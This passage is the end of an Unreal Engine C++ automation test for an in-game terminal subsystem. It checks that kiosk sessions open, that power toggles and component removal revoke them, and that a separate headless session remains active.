	FDocTerminalCommandRequest Status;
	Status.Verb = TEXT("status");
	TestTrue(TEXT("Headless command"), Fixture.Subsystem->ExecuteCommand(HeadlessSession, Status).bSuccess);

	// World example: a kiosk actor with the component.
	AActor* KioskActor = Fixture.World->SpawnActor<AActor>();
	UDocTerminalComponent* Comp = NewObject<UDocTerminalComponent>(KioskActor);
	KioskActor->AddInstanceComponent(Comp);
	Comp->DeviceId = TEXT("WorldKiosk1");
	Comp->Definition = Fixture.CreateDefinition(TEXT("WorldKiosk1"));
	Comp->RegisterComponent();
	const FGuid SessionId = Fixture.Subsystem->OpenSession(TEXT("WorldKiosk1"), Owner, FGameplayTagContainer(), State);
	TestTrue(TEXT("Component-registered device opens"), SessionId.IsValid());
	Comp->SetPowerState(false);
	FDocTerminalSession SessQuery;
	Fixture.Subsystem->QuerySession(SessionId, SessQuery);
	TestEqual(TEXT("Component power toggle revokes session"), SessQuery.State, EDocTerminalSessionState::Revoked);
	Comp->SetPowerState(true);
	const FGuid Second = Fixture.Subsystem->OpenSession(TEXT("WorldKiosk1"), Owner, FGameplayTagContainer(), State);
	TestTrue(TEXT("Power back: new session"), Second.IsValid());
	Comp->UnregisterComponent();
	Fixture.Subsystem->QuerySession(Second, SessQuery);
	TestEqual(TEXT("Removing the kiosk revokes its sessions"), SessQuery.State, EDocTerminalSessionState::Revoked);
	Fixture.Subsystem->QuerySession(HeadlessSession, SessQuery);
	TestEqual(TEXT("Headless device unaffected by the kiosk"), SessQuery.State, EDocTerminalSessionState::Active);
	AddInfo(TEXT("TRM-10: the generic cooked front end is a manual gate; automation covers the headless API and component path."));
	return true;
}

#endif // WITH_DEV_AUTOMATION_TESTS
